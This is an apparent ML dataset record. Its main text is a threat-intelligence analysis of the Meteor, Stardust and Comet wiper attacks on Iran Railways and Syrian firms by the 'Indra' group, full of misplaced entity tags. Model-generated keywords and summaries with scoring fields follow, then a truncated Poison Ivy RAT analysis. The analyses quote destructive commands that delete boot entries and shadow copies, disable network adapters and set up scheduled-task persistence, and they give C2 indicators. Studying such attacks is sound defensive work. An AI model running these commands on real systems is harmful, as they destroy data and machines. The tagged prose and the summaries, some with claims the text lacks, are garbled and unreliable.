SentinelOne released a report based on [ORG] Amnpardaz \u2019s analysis . In this article , we [ORDINAL] first analyze the artifacts left by these attacks . Based on this analysis , we uncover a set of similar tools previously used in other operations during [DATE] 2019 [DATE] - [DATE] 2020 : carried against multiple targets in [GPE] Syria , they did not attract much public attention at the time . We then share some insights into the tactics , techniques , and procedures ( TTPs ) of the underlying actor , which self - identifies as \u201c [PERSON] Indra \u201d and , according to some [NORP] Iranian sources , may have ties to hacktivist or cybercriminal groups . Hunting for the files from the [NORP] Iranian hackWith [ORG] Amnpardaz \u2019s threat database as our starting point , we searched for files with similar names and functionality . The search led us to [CARDINAL] dozens of files , all uploaded from the same [CARDINAL] two sources located in [GPE] Iran . Even though we were n\u2019t able to find all the mentioned artifacts , we recovered most of the execution flow as described in [GPE] Amnpardaz \u2019s report . The execution flow is heavily based on multiple layers of archives and [PERSON] Batch scripts . When detonated , they : url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check Point ResearchAttempt to evade anti - virus detection [PERSON] Destroy the boot configuration data [PERSON] Run the final payloads that aim to lock and completely wipe the computers in the network . The execution flow of the attacks against targets in [ORG] IranThe execution starts with pushing a scheduled task from the AD to all the machines via group policy . The task name is Microsoft\\Windows\\Power Efficiency Diagnostics\\AnalyzeAll and it mimics the [PRODUCT] AnalyzeSystem task performed by [ORG] Windows [ORG] Power [ORG] Efficiency [ORG] Diagnostics report tool . The subsequent chain of .bat files and archives is intended to perform the following operations : Filter the target machines : setup.bat [ORDINAL] first checks if the hostname of the machine is one of the following : [PRODUCT] PIS [PRODUCT] - APP , [ORG] PIS [ORG] - MOB , [ORG] WSUSPROXY or [ORG] PIS [ORG] - DB . If so , it stops the execution and deletes the folder containing the malicious script from this machine . [ORG] PIS in the hostnames stands for [ORG] Passenger [ORG] Information [ORG] System , which is usually responsible among others for updating the platform boards with actual data , so attackers made sure their message to the [NORP] Iranian public will be displayed properly . Download the malicious files onto the machine : the same batch file downloads a cab archive named env.cab from a remote address in the internal network : \\\\railways.ir\\sysvol\\railways.ir\\scripts\\env.cab . The use of specific hostnames and internal paths indicates the attacker had prior knowledge of the environment . Extract and run additional tools : [PERSON] update.bat , which was extracted and started by setup.bat , uses the password hackemall to extract the next stages : cache.bat , msrun.bat and bcd.bat . Disconnect the machine from all networks : the cache.bat script disables all the network adapters on the machine with the following command : powershell -Command \" Get - WmiObject - class Win32_NetworkAdapter | ForEach { If ( $ .NetEnabled ) { $ .Disable ( ) } } \" > NUL Perform Anti - AV checks : the same cache.bat script also checks if [PERSON] Kaspersky [PERSON] Antivirus is installed on the machine and if not , it adds all the files and folders related to the attack to the Windows Defender exclusion list and proceeds with the execution.url \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchCorrupt the boot : bcd.bat is used in order to harm the boot process . [ORDINAL] First , it tries to override the boot file with new content and then deletes the different boot identifiers using Windows built - in BCDEdit tool : for /F \" tokens=2 \" % % j in ( ' % comspec% /c \" bcdedit -v | findstr identifier \" ' ) do bcdedit /delete % % j /f Remove all the traces : the same bcd.bat in addition to boot override also removes Security , [ORG] System [ORG] and [ORG] Application [ORG] Event Viewer logs from the system using wevtutil . Unleash the main payload : The msrun.bat script is responsible for unleashing the Wiper . It moves wiper - related files to \u201c C:\\temp \u201d and creates a scheduled task named mstask to execute the wiper only once at [CARDINAL] 23:55:00.Analysis of the main payload \u2014 The [ORG] WiperThe main payload of the attack is an executable named msapp.exe , and its purpose is to take the victim machine out of service by locking it and wiping its contents . Upon execution , the malware hides this executable \u2019s console window to decrease the suspicion of vigilant victims . Wiper configuration fileThe wiper will refuse to function unless it is provided a path to an encrypted configuration file msconf.conf as a command - line argument . The configuration file allows some degree of flexibility during the execution of the payload and gives the attacker the ability to tailor the attack to specific victims and systems . A helper script to decrypt the configuration file is available in [LOC] Appendix C.The configuration format used supports multiple fields , which jointly hint at this binary \u2019s role in the attack . Supported Configuration Fieldsauto_logon_pathlog_file_pathcleanup_scheduled_task_namelog_server_ipcleanup_script_pathis_alive_loop_intervallog_server_portpaths_to_wipelocker_background_image_jpg_pathprocess_termination_timeoutlocker_background_image_bmp_path processes_to_killlocker_exe_pathlocker_installer_pathself_scheduled_task_namestate_encryption_keylocker_password_hashstate_pathlocker_registry_settings_filesusers_passwordlog_encryption_keywiping_stage_logger_intervalNot all these fields were actually used in the configuration file of the wiper targeting the [NORP] Iranian networks , which might suggest that the tool was not created specifically for this attack ( or otherwise , that its design fell victim to premature optimization).If the configuration is parsed successfully , the program writes the string \" [PERSON] Meteor has started . \" to an encrypted log file , suggesting that the internal name of the malware is \u201c [ORG] Meteor \u201c . As we will see later on in this article , another name was used in previous attacks . Throughout the entire execution of the malware , it keeps logging its actions to this same encrypted log file . These detailed debug logs make it easier to analyze the malicious binary and understand its workflow . Appendix C contains a helper script to decrypt the log file.url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchConfiguration stepsThe malware next sets out to prevent the victim from stopping the ongoing infection . [ORDINAL] First , the machine is removed from the Active Directory domain by using WinAPI or [ORG] WMI . This makes it harder to remotely push any remediation tools to the infected machines . Next , the malware proceeds to corrupt the computer \u2019s boot configuration : in versions of [PRODUCT] Windows prior to Windows 7 , the malware overrides the c:\\boot . ini file ; in Windows 7 and above , it deletes the [ORG] BCD entries . Finally , the malware changes the password of the local users . In the files analyzed , all the passwords chosen by the actor have the same pattern : Aa153![random sequence ] , for example Aa153!rHrrdOvpCj or [GPE] Aa153!IRro3d2JYm .When all the above is said and done , the user will not recover access to their machine easily . At this stage the malware disables the [PRODUCT] Windows screen saver , then changes both the desktop wallpaper and the lock screen images to a custom image . These are the pair of identical [ORG] JPEG and [PRODUCT] BMP images presenting the logo of [GPE] Iran \u2019s Railways and the message similar to the [CARDINAL] one displayed on the platform boards of different railway stations in [GPE] Iran : Something about this \u201c long delays due to cyber attacks \u201d message just tickles our fancy , and betrays a somewhat surrealistic sense of humor on the attackers \u2019 part . They could have written anything , but they chose that . \u201cLong delays due to cyber attacks . More information : [CARDINAL] 64411 \u201d message on the desktop wallpaper set up by the malwareurl \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check Point ResearchWith the above done , the malware logs off all users and executes a small program \u2014 a \u201c locker \u201d \u2014 in a new thread . The path to the locker file named mssetup.exe is retrieved from the configuration . mssetup.exe will prevent the user from interacting with the machine by blocking inputs from the keyboard and mouse devices . Finally , before moving to its main cause \u2014 wiping the system \u2014 the malware creates a scheduled task that assures its own persistence in the system . The scheduled task will be executed every time the system starts . As an aside , there is an extra step that did n\u2019t take place in this specific attack ; the malware is supposed to terminate all processes named in a processes_to_kill list specified in the configuration file . As it happens , the configurations used in the attacks against the [NORP] Iranian targets did not contain this list , and so no processes were terminated . We will later show configuration files from previous attacks that did indeed use this feature . Wiper functionalityInternally , this part is called \" [WORK_OF_ART] Prefix [WORK_OF_ART] Suffix wiper \" . As its name suggests , the malware gets a list of prefixes and suffixes from the configuration file and wipes the files that are matched by this rule . Another string in the malware \u2014 \" Middle Wiper \" \u2014 was probably used by this malware in the past in order to wipe the files that contain some unique substrings . The wiping procedure itself is pretty simple . [ORDINAL] First , the malware goes over the files and directories from the paths_to_wipe config , fills them with [CARDINAL] zero - bytes instead of their real content , and then deletes them . After the wiping procedure , the malware tries to delete the shadow copies by running the following commands : vssadmin.exe delete shadows /all /quiet * * and * * C:\\\\Windows\\\\system32\\\\wbem\\\\wmic.exe shadowcopy delete . Finally , the malware enters an infinite loop where it sleeps based on the is_alive_loop_interval value from the configuration file and writes \" [ORG] Meteor is still alive . \" to the log in every iteration . If all this rings familiar to you , it should ; it \u2019s all straight out from the ransomware playbook \u2014 except this is n\u2019t ransomware , which requires delicate orchestration of public - key and private - key cryptography to make the machine ultimately recoverable ; this is Nuke - it - From - Orbit - ware . It \u2019s a [CARDINAL] one - way trip . Connecting the files to the recent attacks against [NORP] Iranian targetsOur analysis of the files aligns with the analysis conducted by [ORG] Amnpardaz . The flow of the attack is almost identical ; the files have similar structure , the same names and the same functionality . With that said , there are still some differences . For example , the update.bat script that we analyzed is not used by the earlier variants , which instead execute nti.exe \u2014 an [ORG] MBR infector based on the one used by [ORG] NotPetya . Another example is a slight difference between the configuration shown in the [ORG] Amnpardaz report and the configuration that we analyzed . The minor differences are in the paths_to_wipe As we mentioned before , the text that is showed is identical to the text the attackers displayed on the train stations.url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point ResearchOther pieces in the files we analyzed contain names and other artifacts from [EVENT] Iran Railways \u2019 internal network , including computer names and internal [ORG] Active [ORG] Directory object names . For example , [DATE] the [DATE] one [DATE] month before being identified . Attacks Against Companies in [GPE] SyriaHunting for more filesEquipped with the information gathered so far , we went for a hunt to find more samples . Specifically , to find whether the attack on the [NORP] Iranian targets was the [ORDINAL] first time that the attackers utilized these tools . Our queries quickly yielded results \u2014 files that were uploaded to Virus Total by [CARDINAL] three different submitters located in [GPE] Syria . The files seemed to belong to [CARDINAL] three separated incidents and were also contain multiple debug strings , which disclose the internal name of these versions of the wiper \u2014 Stardust and Comet . Out of these [CARDINAL] two versions , [PERSON] Comet is the older one , compiled back in [DATE] September [DATE] 2019 . While we have the complete execution flow of the [CARDINAL] two attacks that utilized Stardust , we only have a partial view of the one where [PERSON] Comet was used . For this reason , we will focus more on the execution chain of [ORG] Stardust .Unlike the recent attacks where the [NORP] Batch files were used during early infections stages , these Stardust executions are based on multiple VBS scripts . What \u2019s more , these scripts contain valuable information \u2014 the identities of the attacks \u2019 targets . The execution flow of the attacks against the [NORP] Syrian companies . The execution flows of both attacks leveled at [GPE] Syria in which [PERSON] Stardust was deployed are very similar and thus they will be described together . The initial payload that runs on the victim \u2019s machine appears to be a VBS script resolve.vbs that extracts a password - protected [ORG] RAR archive to the working folder C:\\\\Program Files\\\\Windows NT\\\\Accessories\\\\ . This [ORG] RAR contains another [ORG] RAR file and [CARDINAL] three other VBS files . Then , the resolve.vbs script runs the extracted scripts in the following order:1 . The [ORDINAL] first script iterates over the installed programs and checks if [PERSON] Kaspersky [PERSON] Antivirus is installed . If so , it tries to uninstall it using hardcoded domain credentials . [CARDINAL] 2 . The [ORDINAL] second script starts by checking if Kaspersky \u2019s avp.exe process is running , and if so it tries to remove the [PERSON] Kaspersky license . [CARDINAL] 3 . The last script extracts the [ORDINAL] second - stage RAR archive and runs an executable file that the archive contains . This stage is the earlier mentioned Stardust variant of the wiper . During the execution of these scripts , several requests are made to a server in order to trace the different steps of the execution . These are GET requests to a URL with the following pattern , where [ORG] C&C [ORG] IP is different between the attacks.url \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] Researchurl IP>/progress.php?hn=&dt=&st=&rs = where : hn = the Host Name dt = [EVENT] the [EVENT] Current [EVENT] Date and Time st = the Current Step rs = the Kaspersky AV running informationEvolution of a [ORG] WiperThe wiper was the final payload used in all [CARDINAL] four incidents . The different names \u2014 [ORG] Meteor , Stardust or Comet , depending on the version \u2014 were n\u2019t the only difference between the variants . During the evolution of [CARDINAL] 3 generations , the attackers introduced several changes in the tool , some are more significant than others . Key changes between the different variants of the wiper are explained below . Comet is the earliest variant we have , and it might as well be the [ORDINAL] first to be created . Unlike Stardust and [ORG] Meteor , it does reference and makes use of all the strings and features inside it . The others contained the artifacts , while the code itself did not utilize them . Comet has a [ORG] Kill [ORG] Switch based on values from the config file including the server [ORG] IP , port , URL path , and a number of requests to perform before aborting . It tries to connect to the server and if it does n\u2019t get a response , or the response status is not [CARDINAL] 200 OK it aborts . In addition , the oldest variant creates a user as an Administrator using NetUserAdd and NetLocalGroupAddMembers APIs . Then it disables the [ORDINAL] first logon animation , as well as the [ORDINAL] first logon Privacy Settings screen . Finally , it adds itself to the auto logon based on a path it has in its configuration . Unlike [PERSON] Meteor , Stardust and Comet do not override the boot . ini file during their attempts to corrupt the boot configuration . This feature , only relevant for Windows versions prior to Windows 7 , only exists in the [ORG] Meteor version . The earliest version , [PERSON] Comet , does not contain the ability to corrupt boot configurations at all.[boot loader]timeout=0default = multi(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS[operating systems]multi(0)disk(10000000)rdisk(0)partition(1000000)\\WINDOWS=\"Microsoft Windows XP Professional \" /noexecute = optin /fastdetectThe content [ORG] Meteor writes to boot . ini . Stardust and Comet use \u201c [WORK_OF_ART] Lock [WORK_OF_ART] My [WORK_OF_ART] PC [WORK_OF_ART] 4 \u201d , a tool that restricts unauthorized use which used to be publicly available . After running the [PERSON] Lock My PC program , they remove the \u201c hkSm \u201d registry value to delete the generated lock password , then delete the uninstaller of the tool to make it harder to recover system functionality . This functionality is not used in [ORG] Meteor , even though it has related artifacts . The configuration files used in the attacks against the [NORP] Syrian targets utilized more fields than the configurations that were used against the [NORP] Iranian targets . These fields include process_to_kill , paths_to_wipe , log_server_ip , and log_server_port . Their content sheds the light on the targets of these operations and indicates that the attacker had access to the targeted networks prior to deploying the final attack . The log_server_ip and log_server_port configuration fields are used by the Stardust wiper to send a Base64 - encoded log file to the remote server . The request is sent via [ORG] HTTP [ORG] POST to the data.html resource on the server . The configs that we obtained contain different values for the servers , disclosing [CARDINAL] two [ORG] IP addresses that were used by the attackers . Who are the targets?url \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check Point ResearchMultiple artifacts that were inspected during the analysis of these [CARDINAL] two Stardust operations in [GPE] Syria point to the targeted companies \u2014 [ORG] Katerji [ORG] Group and its related company [PERSON] Arfada [PERSON] Petroleum \u2014 both located in [GPE] Syria . [ORDINAL] First , the names of these companies appear in the VBS files as the parameters for the commands they executed to disable the Kaspersky AV . Another indication is the paths listed under the paths_to_wipe field in both configurations . These paths contain a list of user names , including the domain administrators of these [CARDINAL] two companies . \"paths_to_wipe \" : [ [ ] \" c:\\\\\\\\Users\\\\\\\\administrator . ARFADA\\\\\\\\Desktop\",\"c:\\\\\\\\Users\\\\\\\\administrator . ARFADA\\\\\\\\Documents \" , [ ] \" paths_to_wipe \" : [ [ ] \" c:\\\\\\\\Users\\\\\\\\administrator . KATERJIGROUP\\\\\\\\Desktop\",\"c:\\\\\\\\Users\\\\\\\\administrator . KATERJIGROUP\\\\\\\\Documents \" , [ ] [ORG] Meet [ORG] IndraOur scrutiny revealed not only the attacks \u2019 targets , but also the identity of the group behind these operations \u2014 a group that calls itself \u201c [PERSON] Indra \u201d after the Hindu God of War . In fact , [PERSON] Indra did not try to hide that they are responsible for these operations , and left their signature in multiple places . The image that was displayed by the attackers on the victims \u2019 locked computers announces \u201c [WORK_OF_ART] I [WORK_OF_ART] am [WORK_OF_ART] Indra \u201d and takes the responsibility for the attacks on [GPE] Katerji group.url \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchWallpaper set up by the [PERSON] Indra actor on victims machines , taking responsibility for the attacks and blaming [ORG] the [ORG] Katerji [ORG] Group for\u201csupporting terrorists \u201d and \u201c trading souls\u201durl \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchIn addition , all samples of the wiper but [ORG] Meteor , contain multiple occurrences of the string \u201c INDRA \u201d . It is used by the Comet variant as the username of a newly created Administrator account . On Stardust though , it serves as an inert artifact , and is not involved in execution . [PERSON] Indra takes responsibility for the attack in which it deployed \u201c Comet\u201d . We wondered whether this [PERSON] Indra attack group has any online presence , and in fact , they do . They operate multiple social network accounts on different platforms , including [PRODUCT] Twitter , Facebook , [PERSON] Telegram , and [ORG] Youtube . Among other information , the accounts contain the disclosure of the attacks on the aforementioned companies : INDRA string inside the Stardust wiperurl \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchIndra group [PRODUCT] Twitter account takes responsibility for the attacks on [ORG] ArfadaSurveying this social network activity , one can get an idea of the group \u2019s political ideology and motive for the attack , and even hear about some of the group \u2019s previous operations . The title of [ORG] INDRA \u2019s official twitter account states that they are \u201c aiming to bring a stop to the horrors of [GPE] QF and its murderous proxies in the region \u201d and they claim to be very focused on attacking different companies who allegedly cooperate with the [NORP] Iranian regime , especially with [ORG] the Quds [ORG] - [ORG] Force and [ORG] Hezbollah . Their posts are all written in [LANGUAGE] English or [LANGUAGE] Arabic ( both do n\u2019t seem to be their native language ) , and most talk about opposing terror or offer document leaks from the various different companies that fell victim to the group \u2019s attacks due to suspected ties to [ORG] the [ORG] Iranian [ORG] Quads [ORG] Force . In their [ORDINAL] first message , posted [DATE] September [DATE] 2019 , INDRA claims to have carried out a successful attack against the company [PERSON] Alfadelex , demolished their network , and leaked the customers \u2019 and employees \u2019 data . [CARDINAL] One of the pictures that were posted by [PERSON] Indra from the hack against [PERSON] Alfadelex shows a webcam photo of a person sitting in front of a computer as they were watching the image we found used by Comet on their screen ( one can only imagine how they felt at that moment ) . Another image , displayed on [ORG] Alfadelex \u2019s website , has the same background as the other images we found used in the attacks against [GPE] Alfadelex , [GPE] Katerji , and [LOC] Arfada . This background image also appears as the cover photo of [ORG] Indra \u2019s [ORG] Twitter and Facebook accounts.url \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point ResearchA screenshot of the attack on [PERSON] Alfadelex posted in [ORG] Indra \u2019s Twitter accounturl \u2014 [ORG] Hackers [ORG] Behind [ORG] Recent [ORG] Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchPrevious [EVENT] Indra [EVENT] OperationsSumming up the social network activity of [PERSON] Indra , the actors claim to be responsible for the following attacks : [DATE] September [DATE] 2019 : an attack against [PERSON] Alfadelex [PERSON] Trading , a currency exchange and money transfer services company located in [GPE] Syria . [DATE] January [DATE] 2020 : an attack against [ORG] Cham [ORG] Wings [ORG] Airlines , a [NORP] Syrian - based private airline company . [DATE] February [DATE] 2020 and [DATE] April [DATE] 2020 : seizure of Afrada \u2019s and [ORG] Katerji [ORG] Group \u2019s network infrastructure . Both companies are situated in [GPE] Syria as well . The infected computer displays the photograph we found from the attack on Alfadelexurl \u2014 Hackers Behind Recent Attacks on [EVENT] Iran [EVENT] - [EVENT] Check [EVENT] Point [EVENT] ResearchNovember [EVENT] 2020 : Indra threatens to attack [ORG] the [ORG] Syrian [ORG] Banias [ORG] Oil refinery , though it is not clear whether the threat was carried out . Around [DATE] November [DATE] 2020 , all of [ORG] Indra \u2019s accounts fell silent . We were n\u2019t able to find evidence of any additional operations until this latest one . Connecting Indra to the Attacks on [NORP] Iranian TargetsThe series of attacks on [NORP] Syrian targets in [DATE] 2019 and [DATE] 2020 bears multiple similarities to the campaigns against the [NORP] Iranian networks . These are similarities in the tools , the [ORG] Tactics , Techniques and Procedures ( [ORG] TTP ) , as well as in the highly targeted nature of the attack , and they make us believe that [PERSON] Indra is also responsible for the recent attacks in [GPE] Iran . The attacks are all directed against [NORP] Iranian - related targets , whether it is [GPE] Iran Railways and [ORG] Iran \u2019s [ORG] Ministry [ORG] of [ORG] Roads in [DATE] 2021 , or [GPE] Katerji , [LOC] Arfada , [PERSON] Alfadelex , and other [NORP] Syrian companies targeted in [DATE] 2020 and [DATE] 2019 . [PERSON] Indra \u2019s tweets and posts make it clear that they are targeting entities that they believe have ties with [GPE] Iran . The multi - layered execution flow in all the attacks we analyzed \u2014 including the recent attacks against [NORP] Iranian targets \u2014 uses script files and archive files as their mean of delivery . The scripts themselves , although they are of different file types , had almost the same functionality . Execution flow relies on previous access and recon info about the targeted network . In case of [NORP] Iranian intrusion , the attackers knew exactly which machines they need to leave unaffected in order to deliver their message publicly ; furthermore , they had access to the railway \u2019s [WORK_OF_ART] Active [WORK_OF_ART] Directory server which they used to distribute the malicious files . Another indication for the reconnaissance done by [PERSON] Indra is the screenshot they took from [ORG] Alfadelex \u2019s Web Camera , showing the office with an infected PC . The wiper is the final payload deployed on the computers of the victims in all the aforementioned attacks . [ORG] Meteor , [ORG] Stardust , and Comet are different versions of the same payload , and we do not have an indication that this tool was ever used by other threat actors . The actor behind the attacks we analyzed did not try to keep their attack a secret . They shared messages and displayed pictures announcing the attacks . In the attacks against the [NORP] Iranian targets , these messages were displayed not only on affected computers but also on the platform boards . Unlike their previous operations , [PERSON] Indra did not publicly take responsibility for the attacks in [GPE] Iran . This might be explained by the seriousness of the new attacks , as well as their impact . While the attacks we inspected in [GPE] Syria were carried against private companies , the attacks against [GPE] Iran Railways and [ORG] the [ORG] Ministry [ORG] of [ORG] Roads [ORG] and [ORG] Urbanization targeted official [NORP] Iranian entities . Moreover , the attacks in [GPE] Syria received little media attention , whereas the attacks against the [NORP] Iranian government were covered extensively all over the world and reportedly caused the [NORP] Iranians some amount of grief . [PERSON] ConclusionBy carrying out an analysis of this latest attack against [GPE] Iran , we were able to reveal its convoluted execution flow as well as [CARDINAL] 2 additional variants of the final \u2018 wiper \u2019 component . These tools , in turn , were used previously in attacks against [NORP] Syrian companies , for which the threat actor [PERSON] Indra took responsibility officially on their social media accounts . While [PERSON] Indra chose not to take responsibility for this latest attack against [GPE] Iran , the similarities above betray the connection . There are [CARDINAL] two lessons to be learned from this incident . [ORDINAL] First , anonymity is a [CARDINAL] one - way street . Once you sacrifice it to reap PR and obtain some sweet likes on [PRODUCT] Twitter , it is not so easily recovered . You can stop broadcasting your actions to the entire world and you might think that you \u2019ve gone under the radar , but The Internet Remembers , and given enough motivation , it will deanonymize you , even if you \u2019re a badass hacktivist threat actor . [ORDINAL] Second , that we should be more worried about attacks that are entirely possible but \u201c clearly are n\u2019t going to happen \u201d according to the calculus of prevailing common wisdom . With all the trouble caused by cybercrime , hacktivism , nation - state meddling and so forth and so on , the extent and sophistication of attacks in general is still a fraction of its complete potential ; oftentimes , threat actors do n\u2019t do X , Y , Z even though they perfectly well could , and we come to rely on this truancy like it were a law of nature . Cases like this , where said threat actors go ahead and do X , Y , Z , ought to raise our collective level of anxiety . As we said in the opening statement , this attack happened in [GPE] Iran , but [DATE] next [DATE] month an equivalent attack could be launched by some other group targeting [GPE] New [GPE] York , and [GPE] Berlin [DATE] the [DATE] month after that . Nothing prevents it , except threat actors \u2019 limited patience , motivation and resources , which", "generated_text": "the report; Check Point Research; cyber attacks; Iranian Railways; the Ministry of Roads; Urban Development systems; July 9; 7; the attackers; the tracks; the railway; July 10; the Ministry; the Ministry; the victims; a wiper; Meteor; Stardust; Comet; the tools; the author; the attackers; the attack; infrastructure; time; the group; cyber espionage; the infrastructure; the attacks; infrastructure; indicators; compromise; the threat actor; these attacks; the Yara rules; a nation-state actor; this attack.", "ref_text": "<START-1>The PDF describes an analysis by Check Point Research of recent cyberattacks against Iranian targets, including Iran's railway system and the Ministry of Roads and Urban Development. The attacks involved malicious software that displayed fake delay messages on station information boards and wiped systems. Check Point's investigation found similarities between these attacks and previous unclaimed attacks on Syrian companies in 2019-2020. All the attacks used a custom wiper malware dubbed Meteor, Stardust, or Comet in different versions. The PDF provides technical details on how the malware works to corrupt systems. The earlier attacks on Syrian companies were claimed by a group calling itself Indra. Indra has an online presence and claimed responsibility for attacks on Syrian companies it accused of ties to Iran's Quds Force. While Indra did not claim the recent Iran attacks, Check Point believes they are responsible based on similarities in target selection, tactics, and the custom malware used. The report concludes that non-state actors have the capability to conduct sophisticated and highly disruptive attacks previously assumed to be solely in the realm of state-sponsored groups. It warns that as non-state groups become more advanced, equivalent attacks could occur anywhere globally. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5454545454545454, "gpt3/lexical/rouge_rouge2": 0.15339233038348082, "gpt3/lexical/rouge_rougeL": 0.2756598240469208, "gpt3/lexical/rouge_rougeLsum": 0.2756598240469208, "gpt3_generated_text": ["The article discusses recent cyber attacks on Iranian infrastructure, specifically targeting Iranian Railways and the Ministry of Roads and Urban Development systems. Check Point Research investigates these attacks and identifies a threat group known as Indra as the responsible party. The attacks are found to be similar to previous activity against private companies in Syria since 2019. The tools used in the attacks, including a wiper called Meteor, Stardust, and Comet, suggest that Indra is not operated by a nation-state actor. The article provides a technical analysis of the tools and tactics used, along with indicators of compromise. The attacks involved displaying messages about train delays or cancellations on information boards and disrupting the websites of the Ministry of Roads and Urbanization. The article highlights the need for cybersecurity measures to protect critical infrastructure from non-state sponsored actors."]}, {"split_name": "val", "sample_id": "val_113", "prompt_text": "Extract the keywords: 2015/10/30Threat Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysisin AnalysisThreat Analysis : Poison Ivy and Links to an [ORG] Extended [ORG] PlugX [ORG] CampaignKey [ORG] Points [ORG] & [ORG] Assessment : [ORG] Japan [ORG] CERT identified a new [ORG] Poison Ivy RAT variant with updated C2 functionality . The malware was created in [DATE] September [DATE] 2014 and uploaded to [ORG] Virus [ORG] Total in [DATE] January [DATE] 2015 . It uses the dynamic [ORG] DNS - provided C2 getstrings[.]jumpingcrab[.]com . This domain has I identified several decoy documents ( see [PERSON] Maltego graph ) that deliver the [LOC] PlugX malware and call - out to [CARDINAL] one of [CARDINAL] two [ORG] IP addresses mentioned above . These documents were reportedly used in a campaign identified by SOPHOS that spanned from [DATE] September [DATE] 2014 [DATE] to [DATE] February [DATE] 2015 . [GPE] India was [CARDINAL] one target of the campaign . Given the infrastructure and timing overlaps , the [ORG] Poison Ivy sample discussed in this post was likely just [CARDINAL] one payload involved in a broader campaign targeting [GPE] India , the [NORP] Tibetan community , and others , that spanned from [DATE] approximately [DATE] September [DATE] 2014 [DATE] to [DATE] February [DATE] 2015 . The [ORG] Poison Ivy sample in this case thus appears to be tied tourl Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysis attacks by [CARDINAL] one or more adversaries acting on behalf of [NORP] Chinese interests . Poison Ivy : New C2 Proxy FunctionalityPoison Ivy ( PIVY ) is a well - known , fully - featured remote access tool ( RAT ) that has existed since [DATE] about [DATE] 2005 . It offers a user - friendly [ORG] GUI , a variety of plugins to enhance functionality , and can be found online by any prospective attacker . And , although anyone can acquire the tool , PIVY is often associated with actors who have a nexus to China.url Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 [ORG] CYINT AnalysisThe malware has been extensively documented \u2013 including its use in espionage - motivated intrusions \u2013 and continues to show signs of active development [ 1 ] . A recent blog post from [ORG] Japan [ORG] CERT ( [ORG] JPCERT ) details new [ORG] Poison Ivy communications functionality . According to [ORG] JPCERT , the malware now uses [ORG] HTTP [ORG] POST requests ( earlier variants use a custom HTTP CONNECT request method ) and supports proxy authentication to command - and - control ( C2 ) servers . Because [ORG] JPCERT has already tackled this variant \u2019s communications functionality , I will examine other aspects of the malware . File & Execution DetailsUnfortunately , we do not know the delivery vector or target . The intended target may have been [CARDINAL] one or more [NORP] Japanese organizations , given that [PERSON] JPCERT was the [ORDINAL] first to dissect this PIVY sample . Alternatively , it is just as likely that [ORG] JPCERT simply observed attacks against other victims . [PERSON] File [PERSON] Name : vscrtapp.exe File size [CARDINAL] 67.0 [PERSON] KB ( [DATE] 68608 bytes ) Compilation timestamp [DATE] 2014 - [DATE] 09 - 14 01:30:49 First submission [DATE] 2015 - 01 - [DATE] 19 [TIME] 11:03:27 [ORG] UTC ( [DATE] 6 [DATE] months , [DATE] 1 [DATE] week [DATE] ago ) The sample will write the file vscrta0ps.log to C:\\Documents and Settings\\All Users\\AppData\\. There appear to be no legitimate applications that would write this file to disk . C:\\Documents and Settings\\All Users\\AppData\\vscrta0ps.logIt will also run the below command : schtasks /create /sc minute /mo [CARDINAL] 1 /tn Update Assist \" /tr \" [PERSON] \\\"C:\\Do cuments and Settings\\All Users\\AppData\\vscrtapp.exe\\ \" \" /ru \" system \" \" This command will create a scheduled task named \u201c Update [WORK_OF_ART] Assist . \u201d I assume this is a non - English speaker \u2019s attempt to create an \u201c Update Assistant \u201d task name . This task will run the malware every minute on the victim \u2019s machine as vscrtapp.exe in the % AppData% directory . The task therefore serves as a basic method of persistence , ensuring that the malware runs regularly . I found no indications that the malware creates any registry keys ; the scheduled task appears to be the malware \u2019s only means of persistence . It is not clear what , if any , legitimate EXE vscrtapp.exe is attempting to mimic . [CARDINAL] One possibility may be [ORG] NetApp \u2019s Virtual Storage Console ( [ORG] VSC ) for [ORG] VMWare ( note that the below image is not the query I ran ; I simply wanted to show the similarity between the names ) . Although developers of PIVY could easily change the name , the presence of the vscrtapp.exe filename could serve as a simple host - based method of detection.url Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 [ORG] CYINT AnalysisThe malware will set a mutex ( it imports the function CreateMutexA ) , although I was unable to determine the value . PIVY InfrastructureC2 communications will be made to getstrings[.]jumpingcrab[.]com using [ORG] HTTP [ORG] POST requests . It is important to note that the domain [ORG] jumpingcrab[.]com is a dynamic [ORG] DNS ( [ORG] DDNS ) service . While not inherently malicious , DDNS providers are often abused by threat actors so they do not have to rely on static infrastructure ; IP resolution for a host could change at any time . Analysis of an attacker \u2019s infrastructure is thus made more difficult . The use of [ORG] DDNS also means that the relevancy and reliability of any infrastructure pivots must be carefully considered . Taking the use of [ORG] DDNS into consideration , here are current and historical resolutions for getstrings[.]jumpingcrab[.]com ( courtesy of PassiveTotal):Resolve [ORG] Location [ORG] Network First Last 47:31url Analysis : Poison Ivy and Links to an Extended PlugX Campaign \u2013 CYINT Analysis47:31 29:15 